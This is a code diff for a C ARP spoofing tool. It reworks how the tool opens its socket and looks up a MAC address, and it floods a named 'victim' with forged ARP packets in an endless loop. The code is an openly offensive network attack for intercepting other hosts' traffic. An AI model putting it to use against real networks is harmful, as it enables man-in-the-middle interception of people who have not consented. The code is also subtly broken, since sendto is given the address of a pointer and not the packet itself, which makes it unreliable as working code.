@@ -30,13 +30,14 @@ static void send_packet(arp_packet_t *packet, arp_t *arp)
 {
     struct sockaddr_ll dest_addr = create_dest_address(arp->iface);
     socklen_t addr_size = sizeof(struct sockaddr_ll);
+    int sock = create_socket();
 
     memcpy(dest_addr.sll_addr, packet->eth_hdr.ether_dhost, ETH_ALEN);
     printf("Found victim’s MAC address: '");
     print_mac_address(packet->eth_hdr.ether_dhost);
     printf("'\n");
     while (true) {
-        if (sendto(arp->sock, &packet, sizeof(arp_packet_t), 0,
+        if (sendto(sock, &packet, sizeof(arp_packet_t), 0,
                 (struct sockaddr *) &dest_addr, addr_size) == -1) {
             perror("sendto");
         }
@@ -48,7 +49,7 @@ static void send_packet(arp_packet_t *packet, arp_t *arp)
 int arp_spoof(arp_t *arp)
 {
     arp_packet_t packet;
-    uint8_t *mac = get_mac_of(arp);
+    uint8_t *mac = get_mac_of(arp->dest_ip, arp->iface);
 
     arp->mac_address = char6_to_mac((unsigned char *)mac);
     init_spoofed(&packet, arp);
